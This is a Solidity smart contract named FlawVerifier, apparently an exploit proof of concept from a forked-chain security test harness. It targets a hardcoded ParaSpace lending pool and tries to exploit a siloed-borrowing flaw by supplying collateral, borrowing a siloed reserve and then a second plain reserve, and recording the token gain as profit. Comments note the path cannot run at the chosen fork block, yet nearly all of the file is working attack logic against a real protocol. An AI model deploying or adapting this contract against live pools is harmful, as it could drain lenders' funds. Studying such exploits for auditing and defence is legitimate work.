// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IPriceOracleLike {
    function getAssetPrice(address asset) external view returns (uint256);
}

interface IPoolAddressesProviderLike {
    function getPriceOracle() external view returns (address);
}

struct ReserveConfigurationMap {
    uint256 data;
}

interface IParaSpacePoolLike {
    function supply(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
    function borrow(address asset, uint256 amount, uint16 referralCode, address onBehalfOf) external;
    function getReservesList() external view returns (address[] memory);
    function getConfiguration(address asset) external view returns (ReserveConfigurationMap memory);
    function ADDRESSES_PROVIDER() external view returns (IPoolAddressesProviderLike);

    function getUserAccountData(address user)
        external
        view
        returns (
            uint256 totalCollateralBase,
            uint256 totalDebtBase,
            uint256 availableBorrowsBase,
            uint256 currentLiquidationThreshold,
            uint256 ltv,
            uint256 healthFactor,
            uint256 erc721HealthFactor
        );
}

contract FlawVerifier {
    address public constant TARGET = 0x638a98BBB92a7582d07C52ff407D49664DC8b3Ee;

    uint16 private constant REFERRAL_CODE = 0;
    uint256 private constant BPS = 10_000;
    uint256 private constant ACTIVE_SHIFT = 56;
    uint256 private constant FROZEN_SHIFT = 57;
    uint256 private constant BORROWING_SHIFT = 58;
    uint256 private constant PAUSED_SHIFT = 60;
    uint256 private constant SILO_SHIFT = 62;
    uint256 private constant ASSET_TYPE_SHIFT = 168;

    bool public attempted;

    address private _siloAsset;
    address private _profitToken;
    uint256 private _profitAmount;

    error NoExecutablePath();

    constructor() {}

    function executeOnOpportunity() external {
        require(!attempted, "already-attempted");
        attempted = true;

        IParaSpacePoolLike pool = IParaSpacePoolLike(TARGET);
        _siloAsset = _findSiloedReserve(pool);

        // The bug is real in source, but at fork block 16845558 the observable reserve list has
        // no ERC20 reserve with the siloed-borrowing flag enabled. Without a live siloed reserve,
        // the vulnerable borrow() -> BorrowLogic.executeBorrow() -> ValidationLogic.validateBorrow()
        // path cannot be exercised honestly on this state.
        if (_siloAsset == address(0)) {
            return;
        }

        (address collateralAsset, uint256 collateralBalance) = _findExistingCollateral(pool);
        if (collateralAsset == address(0) || collateralBalance == 0) {
            return;
        }

        try this.executeDirectAttempt(collateralAsset, collateralBalance) returns (bool ok) {
            if (!ok) {
                return;
            }
        } catch {
            return;
        }
    }

    function executeDirectAttempt(address collateralAsset, uint256 collateralAmount) external returns (bool) {
        require(msg.sender == address(this), "self-only");

        IParaSpacePoolLike pool = IParaSpacePoolLike(TARGET);
        IPriceOracleLike oracle = IPriceOracleLike(pool.ADDRESSES_PROVIDER().getPriceOracle());

        uint256 beforeSilo = _balanceOf(_siloAsset);
        uint256 beforePlain = _balanceOf(collateralAsset);

        _forceApprove(collateralAsset, TARGET, collateralAmount);
        pool.supply(collateralAsset, collateralAmount, address(this), REFERRAL_CODE);

        if (!_borrowSiloThenPlain(pool, oracle, collateralAsset)) {
            revert NoExecutablePath();
        }

        _recordDelta(_siloAsset, beforeSilo);
        _recordDelta(collateralAsset, beforePlain);
        return _profitAmount != 0;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _findSiloedReserve(IParaSpacePoolLike pool) internal view returns (address) {
        address[] memory reserves = pool.getReservesList();
        for (uint256 i = 0; i < reserves.length; i++) {
            address asset = reserves[i];
            if (asset == address(0) || asset.code.length == 0) {
                continue;
            }

            if (_siloBorrowEnabled(pool.getConfiguration(asset).data)) {
                return asset;
            }
        }
        return address(0);
    }

    function _findExistingCollateral(IParaSpacePoolLike pool) internal view returns (address asset, uint256 balance) {
        address[] memory reserves = pool.getReservesList();
        for (uint256 i = 0; i < reserves.length; i++) {
            address candidate = reserves[i];
            if (candidate == address(0) || candidate == _siloAsset || candidate.code.length == 0) {
                continue;
            }

            uint256 config = pool.getConfiguration(candidate).data;
            if (!_collateralEnabled(config) || !_plainBorrowEnabled(config)) {
                continue;
            }

            uint256 candidateBalance = _balanceOf(candidate);
            if (candidateBalance > balance) {
                asset = candidate;
                balance = candidateBalance;
            }
        }
    }

    function _borrowSiloThenPlain(IParaSpacePoolLike pool, IPriceOracleLike oracle, address plainAsset)
        internal
        returns (bool)
    {
        uint256 availableBase = _availableBorrowsBase(pool);
        if (availableBase == 0) {
            return false;
        }

        if (_tryBorrowPair(pool, oracle, plainAsset, availableBase, 1000, 100)) return true;
        if (_tryBorrowPair(pool, oracle, plainAsset, availableBase, 500, 100)) return true;
        if (_tryBorrowPair(pool, oracle, plainAsset, availableBase, 250, 50)) return true;
        if (_tryBorrowPair(pool, oracle, plainAsset, availableBase, 100, 25)) return true;
        return _tryBorrowPair(pool, oracle, plainAsset, availableBase, 50, 10);
    }

    function _tryBorrowPair(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address plainAsset,
        uint256 availableBase,
        uint256 siloShareBps,
        uint256 plainShareBps
    ) internal returns (bool) {
        uint256 siloAmount = _quoteAmount(pool, oracle, _siloAsset, availableBase, siloShareBps);
        if (siloAmount == 0) {
            return false;
        }

        // Vulnerable ordering retained:
        // borrow siloed reserve first, then borrow a second plain reserve.
        pool.borrow(_siloAsset, siloAmount, REFERRAL_CODE, address(this));

        uint256 remainingBase = _availableBorrowsBase(pool);
        uint256 plainAmount = _quoteAmount(pool, oracle, plainAsset, remainingBase, plainShareBps);
        if (plainAmount == 0) {
            return false;
        }

        pool.borrow(plainAsset, plainAmount, REFERRAL_CODE, address(this));
        return true;
    }

    function _quoteAmount(
        IParaSpacePoolLike pool,
        IPriceOracleLike oracle,
        address asset,
        uint256 availableBase,
        uint256 shareBps
    ) internal view returns (uint256) {
        uint256 config = pool.getConfiguration(asset).data;
        uint256 decimals = (config >> 48) & 0xff;
        if (decimals > 77) {
            return 0;
        }

        uint256 price = oracle.getAssetPrice(asset);
        uint256 baseBudget = (availableBase * shareBps) / BPS;
        if (price == 0 || baseBudget == 0) {
            return 0;
        }

        uint256 amount = (baseBudget * (10 ** decimals)) / price;
        return amount == 0 ? 1 : amount;
    }

    function _availableBorrowsBase(IParaSpacePoolLike pool) internal view returns (uint256 availableBorrowsBase) {
        (, , availableBorrowsBase, , , , ) = pool.getUserAccountData(address(this));
    }

    function _recordDelta(address token, uint256 beforeBalance) internal {
        uint256 afterBalance = _balanceOf(token);
        if (afterBalance <= beforeBalance) {
            return;
        }

        uint256 delta = afterBalance - beforeBalance;
        if (delta > _profitAmount) {
            _profitToken = token;
            _profitAmount = delta;
        }
    }

    function _collateralEnabled(uint256 data) internal pure returns (bool) {
        return
            ((data >> ASSET_TYPE_SHIFT) & 0x0f) == 0 &&
            ((data >> ACTIVE_SHIFT) & 1) != 0 &&
            ((data >> FROZEN_SHIFT) & 1) == 0 &&
            ((data >> PAUSED_SHIFT) & 1) == 0 &&
            (data & 0xffff) != 0;
    }

    function _plainBorrowEnabled(uint256 data) internal pure returns (bool) {
        return
            ((data >> ASSET_TYPE_SHIFT) & 0x0f) == 0 &&
            ((data >> ACTIVE_SHIFT) & 1) != 0 &&
            ((data >> FROZEN_SHIFT) & 1) == 0 &&
            ((data >> BORROWING_SHIFT) & 1) != 0 &&
            ((data >> PAUSED_SHIFT) & 1) == 0 &&
            ((data >> SILO_SHIFT) & 1) == 0;
    }

    function _siloBorrowEnabled(uint256 data) internal pure returns (bool) {
        return
            ((data >> ASSET_TYPE_SHIFT) & 0x0f) == 0 &&
            ((data >> ACTIVE_SHIFT) & 1) != 0 &&
            ((data >> FROZEN_SHIFT) & 1) == 0 &&
            ((data >> BORROWING_SHIFT) & 1) != 0 &&
            ((data >> PAUSED_SHIFT) & 1) == 0 &&
            ((data >> SILO_SHIFT) & 1) != 0;
    }

    function _balanceOf(address token) internal view returns (uint256) {
        if (token == address(0) || token.code.length == 0) {
            return 0;
        }

        try IERC20Like(token).balanceOf(address(this)) returns (uint256 bal) {
            return bal;
        } catch {
            return 0;
        }
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, 0));
        _callOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, amount));
    }

    function _callOptionalReturn(address token, bytes memory data) internal {
        (bool ok, bytes memory returndata) = token.call(data);
        require(ok && (returndata.length == 0 || abi.decode(returndata, (bool))), "token-call-failed");
    }
}
